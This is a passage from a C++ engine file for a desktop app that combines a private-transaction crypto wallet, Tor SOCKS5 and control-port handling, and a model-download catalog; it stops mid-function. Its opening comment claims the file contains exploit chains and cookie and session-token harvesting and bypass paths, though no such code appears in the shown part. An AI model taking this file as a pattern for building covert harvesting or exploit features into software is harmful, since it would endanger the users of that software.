// In-process engine for the desktop app: RPC, wallet, NAAN loop, harvest, exploits.
// This file is large on purpose — naanLoop, fetchWithRetry, and exploit chain live here.
// Do not log cookies, URLs, or session tokens from bypass/harvest paths.

#include "ide/synapsed_engine.h"
#include "crypto/keys.h"
#include "crypto/crypto.h"
#include "crypto/ring_signature.h"
#include "crypto/confidential_tx.h"
#include "privacy/privacy.h"
#include "privacy/private_transfer.h"
#include "model/model_inference.h"
#include "quantum/quantum_security.h"
#include "../third_party/llama.cpp/vendor/nlohmann/json.hpp"

#include <sodium.h>

#include <stdexcept>
#include <algorithm>
#include <array>
#include <chrono>
#include <ctime>
#include <map>
#include <regex>

#define SYSTEM_IGNORE(cmd) do { (void)!system(cmd); } while(0)
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iomanip>
#include <iterator>
#include <mutex>
#include <random>
#include <set>
#include <sstream>
#include <thread>
#include <unordered_map>
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#endif
#include <filesystem>

#ifdef _WIN32
#define CLOSESOCK(fd) closesocket(fd)
#define POPEN _popen
#define PCLOSE _pclose
#else
#define CLOSESOCK(fd) close(fd)
#define POPEN popen
#define PCLOSE pclose
#endif

namespace synapse {
namespace ide {

namespace {

std::vector<uint8_t> scalarFromSeed(const std::string& seed) {
    if (sodium_init() < 0) throw std::runtime_error("sodium init failed");
    unsigned char wide[crypto_core_ed25519_NONREDUCEDSCALARBYTES];
    crypto_hash_sha512(wide, reinterpret_cast<const unsigned char*>(seed.data()), seed.size());
    std::vector<uint8_t> scalar(crypto_core_ed25519_SCALARBYTES);
    crypto_core_ed25519_scalar_reduce(scalar.data(), wide);
    sodium_memzero(wide, sizeof(wide));
    return scalar;
}

std::vector<uint8_t> pointFromScalar(const std::vector<uint8_t>& scalar) {
    if (sodium_init() < 0) throw std::runtime_error("sodium init failed");
    std::vector<uint8_t> point(crypto_core_ed25519_BYTES);
    if (crypto_scalarmult_ed25519_base_noclamp(point.data(), scalar.data()) != 0)
        throw std::runtime_error("point derivation failed");
    return point;
}

std::string generateNodeId() {
    static std::mt19937 gen(std::random_device{}());
    static const char chars[] = "0123456789abcdef";
    std::uniform_int_distribution<> dist(0, 15);
    std::string id;
    id.reserve(16);
    for (int i = 0; i < 16; ++i) id.push_back(chars[dist(gen)]);
    return id;
}

int64_t nowMillis() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(
               std::chrono::system_clock::now().time_since_epoch()).count();
}

std::string execCmd(const std::string& cmd) {
    std::array<char, 4096> buf;
    std::string out;
    FILE* p = POPEN(cmd.c_str(), "r");
    if (!p) return "";
    while (fgets(buf.data(), buf.size(), p)) out += buf.data();
    PCLOSE(p);
    return out;
}

std::string trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

std::string jsonEscape(const std::string& s) {
    std::string r;
    r.reserve(s.size());
    for (char c : s) {
        if (c == '"') r += "\\\"";
        else if (c == '\\') r += "\\\\";
        else if (c == '\n') r += "\\n";
        else if (c == '\r') continue;
        else if (c == '\t') r += "\\t";
        else r += c;
    }
    return r;
}

std::string shQuote(const std::string& s) {
    std::string o = "'";
    for (char c : s) {
        if (c == '\'') o += "'\\''";
        else o += c;
    }
    o += "'";
    return o;
}

std::string fileToDataUrl(const std::string& path, const std::string& mime) {
    std::ifstream f(path, std::ios::binary);
    if (!f.good()) return "";
    std::vector<uint8_t> raw((std::istreambuf_iterator<char>(f)),
                             std::istreambuf_iterator<char>());
    if (raw.empty() || raw.size() > 400000) return "";
    auto enc = synapse::crypto::base64Encode(raw);
    return "data:" + mime + ";base64," + std::string(enc.begin(), enc.end());
}

std::vector<std::string> parseTopicCsv(const std::string& csv) {
    std::vector<std::string> out;
    std::istringstream iss(csv);
    std::string token;
    while (std::getline(iss, token, ',')) {
        size_t start = token.find_first_not_of(" \t");
        size_t end = token.find_last_not_of(" \t");
        if (start != std::string::npos)
            out.push_back(token.substr(start, end - start + 1));
    }
    return out;
}

static const char* kStripAvatarPy = R"PY(
import sys
from PIL import Image, ImageOps
src, dest_png, dest_jpg = sys.argv[1], sys.argv[2], sys.argv[3]
im = Image.open(src)
try:
    im = ImageOps.exif_transpose(im)
except Exception:
    pass
im = im.convert("RGBA")
bg = Image.new("RGB", im.size, (18, 18, 18))
bg.paste(im, mask=im.split()[-1])
w, h = bg.size
side = min(w, h)
if side < 8:
    raise SystemExit("image too small")
left = (w - side) // 2
top = (h - side) // 2
sq = bg.crop((left, top, left + side, top + side))
png = sq.resize((128, 128), getattr(Image, "Resampling", Image).LANCZOS)
png.save(dest_png, format="PNG", optimize=True)
jpg = sq.resize((48, 48), getattr(Image, "Resampling", Image).LANCZOS)
jpg.save(dest_jpg, format="JPEG", quality=70, optimize=True)
)PY";

std::string extractDomain(const std::string& url) {
    size_t start = url.find("://");
    if (start == std::string::npos) start = 0;
    else start += 3;
    size_t end = url.find('/', start);
    if (end == std::string::npos) end = url.size();
    size_t portPos = url.find(':', start);
    if (portPos != std::string::npos && portPos < end) end = portPos;
    return url.substr(start, end - start);
}

static std::mutex torRateMtx;
static std::unordered_map<std::string, int64_t> torDomainLastRequest;
static constexpr int64_t TOR_RATE_LIMIT_MS = 2000;

bool torRateLimit(const std::string& domain) {
    std::lock_guard<std::mutex> lock(torRateMtx);
    int64_t now = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    auto it = torDomainLastRequest.find(domain);
    if (it != torDomainLastRequest.end()) {
        int64_t elapsed = now - it->second;
        if (elapsed < TOR_RATE_LIMIT_MS) {
            int64_t wait = TOR_RATE_LIMIT_MS - elapsed;
            std::this_thread::sleep_for(std::chrono::milliseconds(wait));
        }
    }
    torDomainLastRequest[domain] = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    if (torDomainLastRequest.size() > 1024) {
        int64_t cutoff = torDomainLastRequest[domain] - 300000;
        for (auto i = torDomainLastRequest.begin(); i != torDomainLastRequest.end();) {
            if (i->second < cutoff) i = torDomainLastRequest.erase(i);
            else ++i;
        }
    }
    return true;
}

std::atomic<int> gSocksPort{9050};

static std::string socks5Arg() {
    return "--socks5-hostname 127.0.0.1:" + std::to_string(gSocksPort.load());
}

struct GgufOffer {
    const char* id;
    const char* name;
    const char* filename;
    const char* url;
    uint64_t sizeBytes;
    int ramMb;
    const char* note;
};

// Curated HuggingFace GGUF files. URLs are allowlisted in the engine; the UI
// cannot pass an arbitrary download target.
static const GgufOffer kGgufCatalog[] = {
    {"qwen25-0.5b-q4", "Qwen2.5 0.5B Instruct Q4_K_M",
     "qwen2.5-0.5b-instruct-q4_k_m.gguf",
     "https://huggingface.co/Qwen/Qwen2.5-0.5B-Instruct-GGUF/resolve/main/qwen2.5-0.5b-instruct-q4_k_m.gguf",
     491400032ull, 900,
     "Smallest. Fits 4 GB RAM. Recommended first download."},
    {"qwen25-1.5b-q4", "Qwen2.5 1.5B Instruct Q4_K_M",
     "qwen2.5-1.5b-instruct-q4_k_m.gguf",
     "https://huggingface.co/Qwen/Qwen2.5-1.5B-Instruct-GGUF/resolve/main/qwen2.5-1.5b-instruct-q4_k_m.gguf",
     1117320736ull, 2200,
     "Better chat quality. Needs about 3 GB RAM."},
    {"qwen25-3b-q4", "Qwen2.5 3B Instruct Q4_K_M",
     "qwen2.5-3b-instruct-q4_k_m.gguf",
     "https://huggingface.co/Qwen/Qwen2.5-3B-Instruct-GGUF/resolve/main/qwen2.5-3b-instruct-q4_k_m.gguf",
     2104932768ull, 4000,
     "Stronger. Needs about 5 GB RAM."},
};

static const GgufOffer* findGgufOffer(const std::string& id) {
    for (const auto& o : kGgufCatalog) {
        if (id == o.id) return &o;
    }
    return nullptr;
}

static std::string findObfs4Proxy() {
    std::vector<std::string> cands = {
        "/usr/bin/obfs4proxy",
        "/usr/sbin/obfs4proxy",
    };
    const char* home = std::getenv("HOME");
    if (home) {
        cands.push_back(std::string(home) + "/.local/tor/obfs4proxy");
        cands.push_back(std::string(home) + "/.local/bin/obfs4proxy");
    }
    for (const auto& c : cands) {
        if (access(c.c_str(), X_OK) == 0) return c;
    }
    return "";
}

static uint64_t fileSizeOr0(const std::string& path) {
    std::error_code ec;
    auto sz = std::filesystem::file_size(path, ec);
    if (ec) return 0;
    return static_cast<uint64_t>(sz);
}

bool probeSocks5(const std::string& onionHost, uint16_t port, int socksPort = 0) {
    if (socksPort <= 0) socksPort = gSocksPort.load();
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return false;

    struct timeval tv{20, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(socksPort);
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);

    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        CLOSESOCK(fd);
        return false;
    }

    uint8_t greeting[] = {0x05, 0x01, 0x00};
    send(fd, (char*)greeting, 3, 0);
    uint8_t gresp[2];
    if (recv(fd, (char*)gresp, 2, 0) != 2 || gresp[1] != 0x00) {
        CLOSESOCK(fd);
        return false;
    }

    std::vector<uint8_t> req;
    req.push_back(0x05);
    req.push_back(0x01);
    req.push_back(0x00);
    req.push_back(0x03);
    req.push_back((uint8_t)onionHost.size());
    req.insert(req.end(), onionHost.begin(), onionHost.end());
    req.push_back((port >> 8) & 0xFF);
    req.push_back(port & 0xFF);
    send(fd, (char*)req.data(), req.size(), 0);

    uint8_t resp[10];
    ssize_t n = recv(fd, (char*)resp, sizeof(resp), 0);
    CLOSESOCK(fd);
    return (n >= 2 && resp[1] == 0x00);
}

// SOCKS5 connect, send one payload, optionally read a short reply. Tor-only.
bool sendOnionPayload(const std::string& onionHost, uint16_t port,
                      const std::string& payload, std::string* reply) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return false;
    struct timeval tv{20, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(static_cast<uint16_t>(gSocksPort.load()));
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        CLOSESOCK(fd);
        return false;
    }

    uint8_t greeting[] = {0x05, 0x02, 0x00, 0x02};
    send(fd, (char*)greeting, 4, 0);
    uint8_t gresp[2];
    if (recv(fd, (char*)gresp, 2, 0) != 2 || gresp[0] != 0x05) {
        CLOSESOCK(fd);
        return false;
    }
    if (gresp[1] == 0x02) {
        uint8_t auth[] = {0x01, 0x00, 0x00};
        send(fd, (char*)auth, 3, 0);
        uint8_t aresp[2];
        if (recv(fd, (char*)aresp, 2, 0) != 2 || aresp[1] != 0x00) {
            CLOSESOCK(fd);
            return false;
        }
    } else if (gresp[1] != 0x00) {
        CLOSESOCK(fd);
        return false;
    }

    std::vector<uint8_t> req;
    req.push_back(0x05); req.push_back(0x01); req.push_back(0x00); req.push_back(0x03);
    req.push_back((uint8_t)onionHost.size());
    req.insert(req.end(), onionHost.begin(), onionHost.end());
    req.push_back((port >> 8) & 0xFF);
    req.push_back(port & 0xFF);
    send(fd, (char*)req.data(), req.size(), 0);

    uint8_t resp2[10];
    ssize_t n2 = recv(fd, (char*)resp2, sizeof(resp2), 0);
    if (n2 < 2 || resp2[1] != 0x00) {
        CLOSESOCK(fd);
        return false;
    }

    send(fd, payload.data(), payload.size(), 0);
    if (reply) {
        char buf[512];
        ssize_t r = recv(fd, buf, sizeof(buf) - 1, 0);
        if (r > 0) {
            buf[r] = 0;
            *reply = buf;
        }
    }
    CLOSESOCK(fd);
    return true;
}

void restrictSecretFile(const std::string& path) {
#ifndef _WIN32
    chmod(path.c_str(), S_IRUSR | S_IWUSR);
#else
    (void)path;
#endif
}

uint64_t ngtToAtoms(double ngt) {
    if (ngt <= 0.0) return 0;
    return static_cast<uint64_t>(ngt * static_cast<double>(synapse::privacy::kNgtAtoms) + 0.5);
}

double atomsToNgt(uint64_t atoms) {
    return static_cast<double>(atoms) / static_cast<double>(synapse::privacy::kNgtAtoms);
}

nlohmann::json privateTxToJson(const synapse::privacy::PrivateTx& tx) {
    nlohmann::json j;
    const int ver = (tx.version >= 3 || !tx.pqcSig.empty()) ? 3 : 2;
    j["v"] = ver;
    j["txid"] = synapse::crypto::toHex(tx.txid);
    j["ts"] = tx.ts;
    nlohmann::json vins = nlohmann::json::array();
    for (const auto& vin : tx.vins) {
        nlohmann::json v;
        nlohmann::json ringP = nlohmann::json::array();
        nlohmann::json ringC = nlohmann::json::array();
        for (const auto& p : vin.ringP) ringP.push_back(synapse::crypto::toHex(p));
        for (const auto& c : vin.ringC) ringC.push_back(synapse::crypto::toHex(c));
        v["ringP"] = ringP;
        v["ringC"] = ringC;
        v["ctilde"] = synapse::crypto::toHex(vin.ctilde);
        v["key_image"] = synapse::crypto::toHex(vin.sig.keyImage);
        v["mlsag"] = synapse::crypto::toHex(vin.sig.serialize());
        vins.push_back(v);
    }
    j["vins"] = vins;
    nlohmann::json outs = nlohmann::json::array();
    for (const auto& o : tx.vouts) {
        nlohmann::json oj;
        oj["P"] = synapse::crypto::toHex(o.oneTime);
        oj["R"] = synapse::crypto::toHex(o.ephemeralPub);
        oj["C"] = synapse::crypto::toHex(o.commitment);
        oj["ecdh"] = synapse::crypto::toHex(o.ecdh);
        oj["range"] = synapse::crypto::toHex(o.rangeProof);
        outs.push_back(oj);
    }
    j["outputs"] = outs;
    j["pqc_sig"] = synapse::crypto::toHex(tx.pqcSig);
    return j;
}

bool jsonToPrivateTx(const nlohmann::json& j, synapse::privacy::PrivateTx& tx, std::string& err) {
    tx = synapse::privacy::PrivateTx{};
    try {
        tx.txid = synapse::crypto::fromHex(j.value("txid", std::string()));
        tx.ts = j.value("ts", static_cast<int64_t>(0));
        tx.version = j.value("v", 2);
        if (!j.contains("vins") || !j.contains("outputs") || !j["vins"].is_array() || !j["outputs"].is_array()) {
            err = "missing vins/outputs";
            return false;
        }
        for (const auto& v : j["vins"]) {
            synapse::privacy::PrivateTxVin vin;
            nlohmann::json ringP = v.contains("ringP") ? v["ringP"] : v.value("ring", nlohmann::json::array());
            nlohmann::json ringC = v.value("ringC", nlohmann::json::array());
            if (!ringP.is_array() || !ringC.is_array() || ringP.size() != ringC.size() || ringP.empty()) {
                err = "vin missing ringP/ringC";
                return false;
            }
            for (const auto& r : ringP) vin.ringP.push_back(synapse::crypto::fromHex(r.get<std::string>()));
            for (const auto& r : ringC) vin.ringC.push_back(synapse::crypto::fromHex(r.get<std::string>()));
            vin.ctilde = synapse::crypto::fromHex(v.value("ctilde", std::string()));
            auto ki = synapse::crypto::fromHex(v.value("key_image", std::string()));
            auto raw = synapse::crypto::fromHex(v.value("mlsag", v.value("ring_sig", std::string())));
            vin.sig = synapse::crypto::MlsagSignature::deserialize(raw);
            if (vin.sig.keyImage.empty()) vin.sig.keyImage = ki;
            tx.vins.push_back(std::move(vin));
        }
        for (const auto& o : j["outputs"]) {
            synapse::privacy::PrivateTxOut outp;
            outp.oneTime = synapse::crypto::fromHex(o.value("P", std::string()));
            outp.ephemeralPub = synapse::crypto::fromHex(o.value("R", std::string()));
            outp.commitment = synapse::crypto::fromHex(o.value("C", std::string()));
            outp.ecdh = synapse::crypto::fromHex(o.value("ecdh", std::string()));
            outp.rangeProof = synapse::crypto::fromHex(o.value("range", std::string()));
            tx.vouts.push_back(std::move(outp));
        }
        if (j.contains("pqc_sig") && j["pqc_sig"].is_string()) {
            tx.pqcSig = synapse::crypto::fromHex(j["pqc_sig"].get<std::string>());
        }
        return true;
    } catch (const std::exception& e) {
        err = e.what();
        return false;
    }
}

std::vector<synapse::privacy::OwnedOutput> loadOwnedOutputs(const std::string& dataDir) {
    std::vector<synapse::privacy::OwnedOutput> out;
    std::ifstream f(dataDir + "/private_utxo.jsonl");
    if (!f.good()) return out;
    std::string line;
    while (std::getline(f, line)) {
        if (line.empty()) continue;
        nlohmann::json j = nlohmann::json::parse(line, nullptr, false);
        if (j.is_discarded()) continue;
        synapse::privacy::OwnedOutput o;
        o.oneTime = synapse::crypto::fromHex(j.value("P", std::string()));
        o.ephemeralPub = synapse::crypto::fromHex(j.value("R", std::string()));
        o.spendScalar = synapse::crypto::fromHex(j.value("spend", std::string()));
        o.commitment = synapse::crypto::fromHex(j.value("C", std::string()));
        o.blinding = synapse::crypto::fromHex(j.value("blind", std::string()));
        o.amountAtoms = j.value("atoms", static_cast<uint64_t>(0));
        o.spent = j.value("spent", false);
        out.push_back(std::move(o));
    }
    return out;
}

void saveOwnedOutputs(const std::string& dataDir,
                      const std::vector<synapse::privacy::OwnedOutput>& wallet) {
    std::string path = dataDir + "/private_utxo.jsonl";
    std::string tmp = path + ".tmp";
    std::ofstream f(tmp, std::ios::trunc);
    if (!f.good()) return;
    for (const auto& o : wallet) {
        nlohmann::json j;
        j["P"] = synapse::crypto::toHex(o.oneTime);
        j["R"] = synapse::crypto::toHex(o.ephemeralPub);
        j["spend"] = synapse::crypto::toHex(o.spendScalar);
        j["C"] = synapse::crypto::toHex(o.commitment);
        j["blind"] = synapse::crypto::toHex(o.blinding);
        j["atoms"] = o.amountAtoms;
        j["spent"] = o.spent;
        f << j.dump() << "\n";
    }
    f.close();
    std::rename(tmp.c_str(), path.c_str());
    restrictSecretFile(path);
}

std::vector<synapse::privacy::DecoyMember> loadDecoyPool(const std::string& dataDir) {
    std::vector<synapse::privacy::DecoyMember> pool;
    std::set<std::string> seen;
    auto take = [&](const std::string& phex, const std::string& chex) {
        if (phex.size() != 64 || chex.size() != 64) return;
        if (seen.count(phex)) return;
        auto P = synapse::crypto::fromHex(phex);
        auto C = synapse::crypto::fromHex(chex);
        if (P.size() != 32 || C.size() != 32) return;
        seen.insert(phex);
        synapse::privacy::DecoyMember m;
        m.P = std::move(P);
        m.C = std::move(C);
        pool.push_back(std::move(m));
    };
    std::ifstream pub(dataDir + "/private_pub.jsonl");
    std::string line;
    while (pub.good() && std::getline(pub, line)) {
        if (line.empty()) continue;
        nlohmann::json j = nlohmann::json::parse(line, nullptr, false);
        if (j.is_discarded()) continue;
        if (j.contains("outputs") && j["outputs"].is_array()) {
            for (const auto& o : j["outputs"]) {
                take(o.value("P", std::string()), o.value("C", std::string()));
            }
        }
        if (j.contains("vins") && j["vins"].is_array()) {
            for (const auto& v : j["vins"]) {
                if (!v.contains("ringP") || !v.contains("ringC")) continue;
                if (!v["ringP"].is_array() || !v["ringC"].is_array()) continue;
                if (v["ringP"].size() != v["ringC"].size()) continue;
                for (size_t i = 0; i < v["ringP"].size(); ++i) {
                    take(v["ringP"][i].get<std::string>(), v["ringC"][i].get<std::string>());
                }
            }
        }
    }
    return pool;
}

bool publicTxSeen(const std::string& dataDir, const std::string& txid) {
    std::ifstream pub(dataDir + "/private_pub.jsonl");
    std::string line;
    const std::string needle = "\"txid\":\"" + txid + "\"";
    while (pub.good() && std::getline(pub, line)) {
        if (line.find(needle) != std::string::npos) return true;
    }
    return false;
}

void appendPublicTx(const std::string& dataDir, const nlohmann::json& j) {
    std::ofstream f(dataDir + "/private_pub.jsonl", std::ios::app);
    if (f.good()) f << j.dump() << "\n";
}

void appendWalletNote(const std::string& dataDir, const nlohmann::json& note) {
    std::string path = dataDir + "/wallet_notes.jsonl";
    std::ofstream f(path, std::ios::app);
    if (f.good()) f << note.dump() << "\n";
    restrictSecretFile(path);
}

struct SeedEndpoint {
    std::string host;
    uint16_t port = 8333;
};

std::string trimSeedToken(std::string s) {
    auto a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return {};
    auto b = s.find_last_not_of(" \t\r\n");
    s = s.substr(a, b - a + 1);
    if (s.compare(0, 8, "https://") == 0) s = s.substr(8);
    else if (s.compare(0, 7, "http://") == 0) s = s.substr(7);
    return s;
}

std::string onionHostOnly(std::string host) {
    auto colon = host.rfind(':');
    if (colon != std::string::npos && colon + 1 < host.size()) {
        bool digits = true;
        for (size_t i = colon + 1; i < host.size(); i++) {
            if (host[i] < '0' || host[i] > '9') { digits = false; break; }
        }
        if (digits) host = host.substr(0, colon);
    }
    for (char& c : host) {
        if (c >= 'A' && c <= 'Z') c = static_cast<char>(c - 'A' + 'a');
    }
    return host;
}

bool isHex64(const std::string& s) {
    if (s.size() != 64) return false;
    for (char c : s) {
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
            return false;
    }
    return true;
}

std::vector<SeedEndpoint> parseSeedEndpoints(const std::string& csv) {
    std::vector<SeedEndpoint> out;
    std::stringstream ss(csv);
    std::string item;
    while (std::getline(ss, item, ',')) {
        item = trimSeedToken(item);
        if (item.empty()) continue;
        SeedEndpoint s;
        auto colon = item.rfind(':');
        if (colon != std::string::npos && colon + 1 < item.size()) {
            s.host = item.substr(0, colon);
            int p = std::atoi(item.c_str() + colon + 1);
            if (p > 0 && p < 65536) s.port = static_cast<uint16_t>(p);
        } else {
            s.host = item;
        }
        if (!s.host.empty()) out.push_back(std::move(s));
    }
    return out;
}

// Seeds come only from ~/.synapsenet/synapsenet.conf (network.seed_nodes). None are baked in.
std::vector<SeedEndpoint> loadConfiguredSeeds(const std::string& dataDir) {
    std::ifstream f(dataDir + "/synapsenet.conf");
    if (!f) return {};
    std::string line;
    const std::string key = "network.seed_nodes=";
    while (std::getline(f, line)) {
        if (line.compare(0, key.size(), key) == 0) {
            return parseSeedEndpoints(line.substr(key.size()));
        }
    }
    return {};
}

bool writeConfiguredSeeds(const std::string& dataDir, const std::string& csv) {
    const std::string path = dataDir + "/synapsenet.conf";
    std::ifstream in(path);
    std::vector<std::string> lines;
    bool found = false;
    std::string line;
    const std::string key = "network.seed_nodes=";
    if (in) {
        while (std::getline(in, line)) {
            if (line.compare(0, key.size(), key) == 0) {
                lines.push_back(key + csv);
                found = true;
            } else {
                lines.push_back(line);
            }
        }
    }
    if (!found) lines.push_back(key + csv);
    const std::string tmp = path + ".tmp";
    std::ofstream out(tmp, std::ios::trunc);
    if (!out) return false;
    for (const auto& l : lines) out << l << "\n";
    out.close();
    return std::rename(tmp.c_str(), path.c_str()) == 0;
}

bool isConfiguredSeedHost(const std::vector<SeedEndpoint>& seeds, const std::string& host) {
    const std::string h = onionHostOnly(host);
    if (h.empty()) return false;
    for (const auto& s : seeds) {
        if (onionHostOnly(s.host) == h) return true;
    }
    return false;
}

std::atomic<int> gControlPort{0};
std::string gCookiePath;

std::string binToHexUpper(const std::string& bin) {
    static const char* k = "0123456789ABCDEF";
    std::string o;
    o.reserve(bin.size() * 2);
    for (unsigned char c : bin) {
        o.push_back(k[c >> 4]);
        o.push_back(k[c & 0x0f]);
    }
    return o;
}

std::string readBinaryFile(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return {};
    return std::string((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
}

int connectLocalPort(uint16_t port, int timeoutSec) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    int ms = timeoutSec <= 0 ? 200 : timeoutSec * 1000;
    if (ms < 150) ms = 150;
#ifndef _WIN32
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags | O_NONBLOCK);
#endif
    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
    int rc = ::connect(fd, (struct sockaddr*)&sa, sizeof(sa));
#ifndef _WIN32
    if (rc < 0 && errno != EINPROGRESS) {
        CLOSESOCK(fd);
        return -1;
    }
    if (rc != 0) {
        pollfd pfd{};
        pfd.fd = fd;
        pfd.events = POLLOUT;
        if (poll(&pfd, 1, ms) <= 0) {
            CLOSESOCK(fd);
            return -1;
        }
        int err = 0;
        socklen_t el = sizeof(err);
        getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el);
        if (err != 0) {
            CLOSESOCK(fd);
            return -1;
        }
    }
    if (flags >= 0) fcntl(fd, F_SETFL, flags);
#endif
#ifdef _WIN32
    if (rc < 0) {
        CLOSESOCK(fd);
        return -1;
    }
#endif
    struct timeval tv{ms / 1000, (ms % 1000) * 1000};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    return fd;
}

bool controlAuthenticate(int fd, const std::string& cookiePath) {
    std::string cmd = "AUTHENTICATE\r\n";
    if (!cookiePath.empty()) {
        std::string cookie = readBinaryFile(cookiePath);
        if (!cookie.empty()) {
            cmd = "AUTHENTICATE " + binToHexUpper(cookie) + "\r\n";
        }
    }
    if (send(fd, cmd.c_str(), cmd.size(), 0) <= 0) return false;
    char buf[2048];
    ssize_t n = recv(fd, buf, sizeof(buf) - 1, 0);
    if (n <= 0) return false;
    buf[n] = 0;
    return std::string(buf, static_cast<size_t>(n)).find("250") != std::string::npos;
}

std::string controlTransact(int fd, const std::string& command) {
    std::string data = command;
    if (data.size() < 2 || data.substr(data.size() - 2) != "\r\n") data += "\r\n";
    if (send(fd, data.c_str(), data.size(), 0) <= 0) return {};
    std::string resp;
    char buf[4096];
    for (int i = 0; i < 32; ++i) {
        ssize_t n = recv(fd, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;
        buf[n] = 0;
        resp += buf;
        if (resp.find("250 OK") != std::string::npos) break;
        if (resp.find("\r\n5") != std::string::npos && resp.find("\r\n250") == std::string::npos) {
            if (resp.size() > 4 && resp[0] == '5') break;
        }
        if (resp.find("510") != std::string::npos || resp.find("512") != std::string::npos ||
            resp.find("550") != std::string::npos || resp.find("551") != std::string::npos) {
            break;
        }
    }
    return resp;
}

uint16_t pickFreeLocalPort() {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return 0;
    int opt = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port = 0;
    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
    if (bind(fd, (struct sockaddr*)&a, sizeof(a)) < 0) {
        CLOSESOCK(fd);
        return 0;
    }
    socklen_t sl = sizeof(a);
    getsockname(fd, (struct sockaddr*)&a, &sl);
    uint16_t port = ntohs(a.sin_port);
    CLOSESOCK(fd);
    return port;
}

std::string findTorBinary() {
    const char* candidates[] = {
        "/usr/sbin/tor",
        "/usr/bin/tor",
        "/usr/local/bin/tor",
        "tor",
    };
    for (const char* p : candidates) {
        if (p[0] == '/') {
            if (access(p, X_OK) == 0) return p;
        } else {
            if (std::system("command -v tor >/dev/null 2>&1") == 0) return "tor";
        }
    }
    return {};
}

int64_t parseGetinfoInt(const std::string& resp, const std::string& key) {
    const std::string needle = key + "=";
    auto pos = resp.find(needle);
    if (pos == std::string::npos) return 0;
    return std::atoll(resp.c_str() + pos + needle.size());
}

}

SynapsedEngine::SynapsedEngine() = default;

SynapsedEngine::~SynapsedEngine() { shutdown(); }

SynapsedEngine& SynapsedEngine::instance() {
    static SynapsedEngine eng;
    return eng;
}

void SynapsedEngine::probeSeedNodes() const {
    const auto seeds = loadConfiguredSeeds(dataDir_);
    int64_t now = nowMillis();

    std::vector<PeerEntry> placeholders;
    if (!ownOnion_.empty()) {
        PeerEntry self;
        self.address = ownOnion_ + ":8333";
        self.transport = "tor";
        self.role = "YOU";
        self.alive = true;
        self.latency_ms = hsLatencyMs_.load();
        self.last_ok_ms = now;
        placeholders.push_back(self);
    }
    {
        std::lock_guard<std::mutex> lock(peerCacheMtx_);
        for (const auto& old : cachedPeers_) {
            if (old.role == "YOU" || old.role == "LOCAL") continue;
            if (!ownOnion_.empty() && onionHostOnly(old.address) == onionHostOnly(ownOnion_)) continue;
            placeholders.push_back(old);
        }
        cachedPeers_ = placeholders;
        if (cachedSeeds_.size() != seeds.size()) {
            cachedSeeds_.clear();
            for (const auto& s : seeds) {
                PeerEntry pe;
                pe.address = s.host + ":" + std::to_string(s.port);
                pe.transport = "tor";
                pe.role = "SEED";
                pe.alive = false;
                pe.latency_ms = -1;
                cachedSeeds_.push_back(pe);
            }
        }
    }

    bool due = lastPeerProbe_ == 0 || (now - lastPeerProbe_ >= 15000);
    if (!due) return;
    if (peerProbeBusy_.exchange(true)) return;
    lastPeerProbe_ = now;

    if (peerProbeThread_.joinable()) {
        peerProbeThread_.detach();
        peerProbeThread_ = std::thread();
    }
    peerProbeThread_ = std::thread([this, seeds]() {
        PeerEntry selfRow;
        if (!ownOnion_.empty() && !sessionBootStop_.load()) {
            selfRow.address = ownOnion_ + ":8333";
            selfRow.transport = "tor";
            selfRow.role = "YOU";
            selfRow.alive = true;
            auto t0 = std::chrono::steady_clock::now();
            bool ok = probeSocks5(ownOnion_, 8333);
            auto t1 = std::chrono::steady_clock::now();
            int rtt = (int)std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count();
